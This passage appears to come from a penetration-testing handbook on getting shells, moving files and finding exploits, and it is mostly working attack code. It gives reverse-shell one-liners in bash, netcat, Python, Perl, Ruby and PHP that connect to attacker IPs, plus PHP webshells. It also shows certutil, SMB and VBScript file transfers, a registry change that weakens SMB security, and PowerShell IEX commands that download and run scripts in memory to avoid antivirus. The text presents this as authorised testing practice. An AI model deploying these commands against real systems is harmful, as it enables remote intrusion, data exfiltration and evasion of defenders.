<p>When we talk about shells &amp; shelling, we refer to the act of getting an interactive shell over the wire (usually via RCE). This involves executing the default command-line interpreter (<code>/bin/sh</code>, <code>cmd.exe</code> &#8230;&#8203;) and connecting its STDIO streams to network sockets such that we can read and write to the interpreter over a network.</p>
</div>
<div class="paragraph">
<p>There are two major types of shells: Bind and Reverse shells.</p>
</div>
<div class="paragraph">
<p>A bind shell is setup on the victim machine and binds to a port, listening for an incoming connection.</p>
</div>
<div class="paragraph">
<p>On the other hand, a reverse shell will connect back from the victim host to the attacker&#8217;s machine - where we will catch it with a listener.</p>
</div>
<div class="paragraph">
<p>Most of the time, we employ reverse shells as firewalls will block incoming connections on ports that are not whitelisted; a connection coming from inside the network is more likely to succeed than one initiated from outside the boundary.</p>
</div>
<div class="paragraph">
<p>Lets break down the common vectors for spawning a shell once we&#8217;ve exploited one or more vulnerabilities.</p>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>When we think we&#8217;ve managed to exploit a vulnerability to achieve RCE, it may be tempting to go straight to a shell. Always, <strong>always</strong>, confirm an RCE vulnerability before trying to spawn a shell - it will save us many headaches in the long run. A shell connection requires much to be just right, from ports not being blocked by firewalls to enabled socket functionality.</p>
</div>
<div class="paragraph">
<p>Simple methods include pinging the attacking machine, connecting to an out of band vector (e.g. DNS query) and creating dummy files.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect2">
<h3 id="_command_line_execution_bash">Command Line Execution / Bash</h3>
<div class="paragraph">
<p>If we have limited control over the execution of commands (e.g. Command injection vulnerabilities), there are a few common approaches to spawning a shell.</p>
</div>
<div class="sect3">
<h4 id="_netcat">netcat</h4>
<div class="paragraph">
<p>If netcat (or any similar tool) is available on the machine (whether we have uploaded them or otherwise) we should try spawning a listener and a reverse shell.</p>
</div>
<div class="paragraph">
<p>If we have a nc binary with process execution enabled (or in the unlikely event that it is present on the victim) we can simply connect a shell to nc and send back a reverse shell.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">nc -nvlp 8080</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">nc -e /bin/sh 10.10.10.10 8080</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Otherwise, we can use <code>mkfifo</code> to create a named pipe that we interactive attach a bash session to. We then pipe the output of the bash session to netcat (or similar) and redirect the output of netcat (which will be our input commands from the attacking box) to the named pipe and in turn, the interactive shell.</p>
</div>
<div class="paragraph">
<p>Think of this as a fancy feedback loop between netcat and bash, using the named pipe and the fact that cat will stay open on a named pipe. (Note the redirection of STDERR to STDOUT - <code>2&gt;&amp;1</code>).</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">mkfifo /tmp/pipe;</span><span class="w"> </span><span class="nb">cat</span> /tmp/pipe | /bin/sh <span class="nt">-i</span> 2&gt;&amp;1 | nc 10.10.10.10 8080 <span class="o">&gt;</span> /tmp/pipe</code></pre>
</div>
</div>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Security Pattern"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Try multiple ports when trying to spawn a reverse shell. Always use some common service ports (443, 8080, 80, 21 &#8230;&#8203;) if a random high port doesn&#8217;t seem to work.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
<div class="sect3">
<h4 id="_interactive_bash_piping">Interactive Bash Piping</h4>
<div class="paragraph">
<p>We can again take advantage of redirection here to redirect an interactive bash session to the <code>/dev/tcp</code> file descriptors for network sockets.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">bash -i &gt;</span>&amp; /dev/tcp/10.10.10.10/8080 0&gt;&amp;1</code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_custom_binaries">Custom Binaries</h4>
<div class="paragraph">
<p>We can employ tooling such as <code>msfvenom</code> to package reverse shells into appropriate formats for execution by exploits (e.g. x86 Assembly for weaponising a buffer overflow exploit).</p>
</div>
<div class="paragraph">
<p>Alternatively, we can create our own shells with C (usually) and a bit of elbow grease.</p>
</div>
<div class="paragraph">
<p>TODO: Walk through basic C socketing for a reverse shell</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_scripting_languages">Scripting Languages</h3>
<div class="paragraph">
<p>Often, exploiting a vulnerability will eventually allow us to execute code in the context of a scripting language (e.g. Python, Ruby) or upload a file to be interpreted by a backend webserver (e.g. PHP or CFM webshells). In these cases, we should take advantage of networking &amp; process management functions to spawn our shell.</p>
</div>
<div class="paragraph">
<p>Here are some shells for common scripting languages.</p>
</div>
<div class="sect3">
<h4 id="_powershell_2">Powershell</h4>
<div class="paragraph">
<p>TODO: Nishang</p>
</div>
</div>
<div class="sect3">
<h4 id="_python">Python</h4>
<div class="paragraph">
<p>We can invoke a Python "one liner" to spawn a reverse shell for Unix systems.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.10.10.10"</span><span class="p">,</span><span class="mi">8080</span><span class="p">));</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-i"</span><span class="p">]);</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can take advantage of Python&#8217;s <code>-c</code> flag to execute this on the command line, if convenient.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">python -c 'import socket,subprocess,os;</span><span class="nv">s</span><span class="o">=</span>sock...<span class="s1">'</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can also construct an equivalent for Windows systems. Here is one courtesy of Mark Haase &amp; user9123: <a href="#markshellwindows">[3]</a></p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="k">exec</span><span class="p">(</span><span class="s">"""import os, socket, subprocess, threading, sys</span><span class="se">\n</span><span class="s">def s2p(s, p):</span><span class="se">\n</span><span class="s">    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()</span><span class="se">\n</span><span class="s">def p2s(s, p):</span><span class="se">\n</span><span class="s">    while True: s.send(p.stdout.read(1).encode())</span><span class="se">\n</span><span class="s">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><span class="se">\n</span><span class="s">while True:</span><span class="se">\n</span><span class="s">    try: s.connect((192.168.119.138, 443)); break</span><span class="se">\n</span><span class="s">    except: pass</span><span class="se">\n</span><span class="s">p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)</span><span class="se">\n</span><span class="s">threading.Thread(target=s2p, args=[s,p], daemon=True).start()</span><span class="se">\n</span><span class="s">threading.Thread(target=p2s, args=[s,p], daemon=True).start()</span><span class="se">\n</span><span class="s">try: p.wait()</span><span class="se">\n</span><span class="s">except: s.close(); sys.exit(0)"""</span><span class="p">)</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_perl">Perl</h4>
<div class="paragraph">
<p>A similar one liner for Perl.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="perl"><span class="k">use</span> <span class="nv">IO</span><span class="p">;</span><span class="nv">$c</span><span class="o">=</span><span class="k">new</span> <span class="nn">IO::Socket::</span><span class="nv">INET</span><span class="p">(</span><span class="nv">PeerAddr</span><span class="p">,"</span><span class="s2">10.10.10.10:8080</span><span class="p">");</span><span class="bp">STDIN</span><span class="o">-&gt;</span><span class="nv">fdopen</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">r</span><span class="p">);</span><span class="vg">$~</span><span class="o">-&gt;</span><span class="nv">fdopen</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">w</span><span class="p">);</span><span class="nb">system</span><span class="vg">$_</span> <span class="k">while</span><span class="o">&lt;&gt;</span><span class="p">;</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_ruby">Ruby</h4>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">f=TCPSocket.open("10.0.0.1",1234).to\_i;</span><span class="nb">exec </span>sprintf<span class="o">(</span><span class="s2">"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d"</span>,f,f,f<span class="o">)</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Again, we can invoke this from the command line. Don&#8217;t forget to require (<code>-r</code>) the socket gem.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="ruby"><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("10.0.0.1",1234).to\_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>TODO: Investigate file descriptor issues</p>
</div>
</div>
<div class="sect3">
<h4 id="_php">PHP</h4>
<div class="paragraph">
<p>Often we will encounter situations where we can execute arbitrary PHP files or get the web server to run them for us (e.g. Arbitrary File Upload, LFI/RFI). There are many well documented vectors for RCE with PHP - here are a few:</p>
</div>
<div class="sect4">
<h5 id="_opening_a_socket">Opening a Socket</h5>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="php"><span class="o">&lt;?</span><span class="n">php</span> <span class="nv">$sock</span><span class="o">=</span><span class="nb">fsockopen</span><span class="p">(</span><span class="s2">"10.10.10.10"</span><span class="p">,</span><span class="mi">8080</span><span class="p">);</span><span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span><span class="p">);</span> <span class="cp">?&gt;</span></code></pre>
</div>
</div>
</div>
<div class="sect4">
<h5 id="_passing_commands_to_execute">Passing commands to execute</h5>
<div class="paragraph">
<p>There are many ways to execute commands from within PHP.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="php"><span class="o">&lt;?</span><span class="n">php</span> <span class="k">echo</span> <span class="nb">passthru</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">);</span> <span class="cp">?&gt;</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>To construct a rudimentary webshell, we may also like to execute passed in parameters (in an uploaded PHP file):</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="php"><span class="o">&lt;?</span><span class="n">php</span> <span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="php"><span class="o">&lt;?</span><span class="n">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="php"><span class="o">&lt;?</span><span class="n">php</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>In a hardened PHP environment, these functions will usually be disabled.</p>
</div>
</div>
<div class="sect4">
<h5 id="_proper_webshells">Proper Webshells</h5>
<div class="paragraph">
<p>In a similar vein, there are a number of fully fledged webshells available in various repositories. e.g. <a href="https://github.com/b374k/b374k" class="bare">https://github.com/b374k/b374k</a>, <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" class="bare">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a>.</p>
</div>
<div class="paragraph">
<p>Better yet, make your own!</p>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Don&#8217;t forget to remove webshells and anything else we&#8217;ve touched the system with when we&#8217;re done. The client should <strong>not</strong> have to clean up after us.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_file_transfer">File Transfer</h2>
<div class="sectionbody">
<div class="paragraph">
<p>File transfer is an essential technique both before, during and after exploitation - we need a reliable way of getting binaries &amp; data in and out of the network boundary; to and from our attacking machine.</p>
</div>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Security Pattern"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Where possible, we want to adopt a "living off the land" mindset once we&#8217;re on the victim system. When we employ native utilities or well known administrative tooling (e.g. sysinternals &amp; Powershell for Windows) we reduce the chance of alerting defenders and automated security measures. Sometimes, native binaries will be all we have to work with due to environmental restriction!</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect2">
<h3 id="_mundane_functionality">Mundane Functionality</h3>
<div class="paragraph">
<p>We can abuse existing functionality designed for uploading and downloading. Here are some examples:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>SCP (copying files over an SSH-like protocol)</p>
</li>
<li>
<p>Web applications that feature file upload</p>
</li>
<li>
<p>Anonymous FTP access</p>
</li>
<li>
<p>Public SMB shares</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_certutil">Certutil</h3>
<div class="paragraph">
<p>Certutil is a command line Windows program installed by default as part of Certificate Services - designed to interact with Certificate Authorities. We can abuse the dumping functionality to retrieve files at a URL (e.g. from a spun up Python web server).</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">certutil -urlcache -split -f "http://ip-addr:port/file" [output-file]</span></code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_smb">SMB</h3>
<div class="paragraph">
<p>Impacket provides the handy <code>impacket-smbserver</code> utility that allows us to start a temporary SMB share - great for hosting files to transfer to a Windows host.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">impacket-smbserver &lt;ARBITRARY SHARE NAME&gt;</span><span class="w"> </span>&lt;LOCAL PATH&gt;</code></pre>
</div>
</div>
<div class="paragraph">
<p>Once we host the files, we can then copy them over from a Windows box:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">copy \\&lt;ATTACKING IP&gt;</span><span class="se">\&lt;</span>SHARE NAME&gt;<span class="se">\&lt;</span>FILE&gt;</code></pre>
</div>
</div>
<div class="paragraph">
<p>or copy to the share (upload files from the host):</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">copy &lt;LOCAL FILE&gt;</span><span class="w"> </span><span class="se">\\</span>&lt;ATTACKING IP&gt;<span class="se">\&lt;</span>SHARE NAME&gt;<span class="se">\&lt;</span>FILE&gt;</code></pre>
</div>
</div>
<div class="paragraph">
<p>Some hosts will not accept the SMB1 protocol for security reasons. We can invoke the (relatively stable) experimental SMB2 support with the <code>-smb2support</code> switch.</p>
</div>
<div class="paragraph">
<p>Additionally, security policy may block unauthorized guest access. If we are on a compromised box and have the privileges to regedit, we can disable this behaviour with reg (or any other registry editor):</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /t REG_DWORD /d 1</span></code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_wget">Wget</h3>
<div class="paragraph">
<p>We can employ the abilities of VBScript on Windows machines to create a rudimentary version of <code>wget</code>.</p>
</div>
<div class="paragraph">
<p>Courtesy of Eric Phelps <a href="#ericphelps">[4]</a></p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="vb"><span class="n">echo</span> <span class="n">strUrl</span> <span class="o">=</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Arguments</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="n">StrFile</span> <span class="o">=</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Arguments</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Const</span> <span class="nv">HTTPREQUEST_PROXYSETTING_DEFAULT</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Const</span> <span class="nv">HTTPREQUEST_PROXYSETTING_PRECONFIG</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Const</span> <span class="nv">HTTPREQUEST_PROXYSETTING_DIRECT</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Const</span> <span class="nv">HTTPREQUEST_PROXYSETTING_PROXY</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Dim</span> <span class="nv">http</span><span class="p">,</span> <span class="n">varByteArray</span><span class="p">,</span> <span class="n">strData</span><span class="p">,</span> <span class="n">strBuffer</span><span class="p">,</span> <span class="n">lngCounter</span><span class="p">,</span> <span class="n">fs</span><span class="p">,</span> <span class="n">ts</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="n">Err</span><span class="p">.</span><span class="n">Clear</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Set</span> <span class="n">http</span> <span class="o">=</span> <span class="k">Nothing</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Set</span> <span class="n">http</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WinHttp.WinHttpRequest.5.1"</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">If</span> <span class="n">http</span> <span class="ow">Is</span> <span class="k">Nothing</span> <span class="k">Then</span> <span class="k">Set</span> <span class="n">http</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WinHttp.WinHttpRequest"</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">If</span> <span class="n">http</span> <span class="ow">Is</span> <span class="k">Nothing</span> <span class="k">Then</span> <span class="k">Set</span> <span class="n">http</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"MSXML2.ServerXMLHTTP"</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">If</span> <span class="n">http</span> <span class="ow">Is</span> <span class="k">Nothing</span> <span class="k">Then</span> <span class="k">Set</span> <span class="n">http</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Microsoft.XMLHTTP"</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="n">http</span><span class="p">.</span><span class="n">Open</span> <span class="s">"GET"</span><span class="p">,</span> <span class="n">strURL</span><span class="p">,</span> <span class="k">False</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="n">http</span><span class="p">.</span><span class="n">Send</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="n">varByteArray</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">ResponseBody</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Set</span> <span class="n">http</span> <span class="o">=</span> <span class="k">Nothing</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Set</span> <span class="n">fs</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.FileSystemObject"</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Set</span> <span class="n">ts</span> <span class="o">=</span> <span class="n">fs</span><span class="p">.</span><span class="n">CreateTextFile</span><span class="p">(</span><span class="n">StrFile</span><span class="p">,</span> <span class="k">True</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="n">strData</span> <span class="o">=</span> <span class="s">""</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="n">strBuffer</span> <span class="o">=</span> <span class="s">""</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">For</span> <span class="n">lngCounter</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">to</span> <span class="n">UBound</span><span class="p">(</span><span class="n">varByteArray</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="n">ts</span><span class="p">.</span><span class="n">Write</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">255</span> <span class="ow">And</span> <span class="n">Ascb</span><span class="p">(</span><span class="n">Midb</span><span class="p">(</span><span class="n">varByteArray</span><span class="p">,</span><span class="n">lngCounter</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="k">Next</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
<span class="n">echo</span> <span class="n">ts</span><span class="p">.</span><span class="n">Close</span> <span class="o">&gt;&gt;</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can run the script with the <code>cscript</code> script host to retrieve a hosted file:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">cscript wget.vbs http://&lt;ATTACKING IP&gt;</span>/&lt;FILE&gt; &lt;FILE&gt;</code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_powershell_3">Powershell</h3>
<div class="paragraph">
<p>The <code>Invoke-WebRequest</code> cmdlet has switches to download a remote file to disk.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="powershell"><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s1">'http://&lt;ATTACKING IP&gt;/&lt;FILE&gt;'</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="s1">'&lt;FILE&gt;'</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Powershell also features the <code>Net.WebClient</code> cmdlet that allows us to retrieve remote files over the wire.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="powershell"><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://&lt;ATTACKING IP&gt;:&lt;PORT&gt;/&lt;FILE&gt;'</span><span class="p">,</span><span class="w"> </span><span class="s1">'&lt;FILE&gt;'</span><span class="p">)</span></code></pre>
</div>
</div>
<div class="paragraph">
<p><strong>Use single quotes</strong> - this signifies a string literal to powershell. Double quotes will try to expand the expression.</p>
</div>
<div class="paragraph">
<p>We can dump this to a file for another rudimentary version of wget.
Remember: When we&#8217;re working with powershell we usually want to bypass the execution policy (and profile), along with disabling the logo and enabling non interactive mode.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File webclient.ps1</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Alternatively, we can run the client as a one liner:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">powershell -c (New-Object Net.WebClient).DownloadFile('http://&lt;ATTACKING IP&gt;</span>:&lt;PORT&gt;/&lt;FILE&gt;<span class="s1">', '</span>&lt;FILE&gt;<span class="s1">')</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We may also run powershell scripts over the wire by (ab)using IEX - Invoke-Expression. <strong>This is handy for downloading scripts directly into memory</strong> and avoiding anti virus solutions flagging stuff on disk.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="powershell"><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;ATTACKING IP&gt;/file.ps1'</span><span class="p">)</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Similarly, with <code>Invoke-WebRequest</code>:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="powershell"><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">IEX</span><span class="p">(</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="s1">'http://&lt;ATTACKING IP&gt;/file.ps1'</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">)</span></code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_netcat_2">Netcat</h3>
<div class="paragraph">
<p>TODO: Literally just piping out of netcat stream.</p>
</div>
</div>
<div class="sect2">
<h3 id="_verifying_integrity">Verifying Integrity</h3>
<div class="paragraph">
<p>Windows &amp; Linux Hashing/Checksum utilities. TODO</p>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_exploit_repositories">Exploit Repositories</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Exploit repositories are not only a great way to learn exploit development (learn by example!), they provide us with both weaponised exploits and Proof-of-Concept (PoC) code. The two most well known are Exploit Database (maintained by Offensive Security) and Packet Storm.</p>
</div>
<div class="paragraph">
<p>Additionally, both ExploitDB and Packet Storm feature many handcrafted shellcode snippets - e.g. <code>/bin/sh</code> in 26 bytes - which are handy for vulnerabilities with tight space budgets (e.g. small buffers).</p>
</div>
<div class="paragraph">
<p>There are also numerous forums and smaller communities that share exploits and wisdom which, depending on your inclination, may be worth your time.</p>
</div>
<div class="imageblock text-center">
<div class="content">
<a class="image" href="https://www.exploit-db.com/"><img src="Images/exploitdb.png" alt="exploitdb"></a>
</div>
<div class="title">Figure 3. Exploit DB query for <em>Wordpress</em></div>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Always, always, always read the source code of exploits. Likewise, don&#8217;t copy paste commands willy nilly (hidden commands may be injected by a malicious webpage into your clipboard).</p>
</div>
<div class="paragraph">
<p>Many old exploits have "skiddy" protection and will probably require minor editing.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Security Pattern"></i>
</td>
<td class="content">
<div class="paragraph">
